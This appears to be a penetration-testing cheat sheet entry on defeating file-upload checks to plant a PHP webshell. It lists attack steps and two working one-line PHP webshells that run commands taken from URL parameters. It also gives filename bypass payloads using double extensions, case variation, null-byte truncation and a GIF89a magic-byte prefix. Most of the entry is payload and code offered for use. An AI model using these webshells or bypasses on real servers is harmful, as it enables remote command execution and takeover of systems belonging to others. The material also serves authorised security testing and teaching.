# 04.02 File Upload Bypass → Webshell

> Defeat extension/MIME/magic-byte checks with double extensions (`.php.jpg`), case variation (`.PhP`, `.phtml`), or Content-Type spoofing.

## Overview

Whitelist/blacklist of extensions, MIME type, or magic-byte checks all have bypasses. Common: double extension (.php.jpg on misconfigured Apache), case variation (.PhP, .phtml), Content-Type spoofing.

## Steps

- **Identify the check** — extension, MIME, magic bytes, file size.
- **Pick a bypass** — phtml, php5, php7, .phar, %00 truncation, GIF89a; prefix.
- **Locate upload path** — guess or LFI/source-disclose it.
- **Trigger** — browse the uploaded file.

## Commands

### PHP webshell variants

```php
<?php system($_GET['c']); ?>
<?=`$_GET[0]`?>
```

### Bypass tries

```text
shell.php           # default
shell.phtml         # extra extension
shell.PhP           # case
shell.php.jpg       # double extension
shell.php%00.jpg    # null byte
GIF89a;\n<?php ... ?>  # magic bytes
```
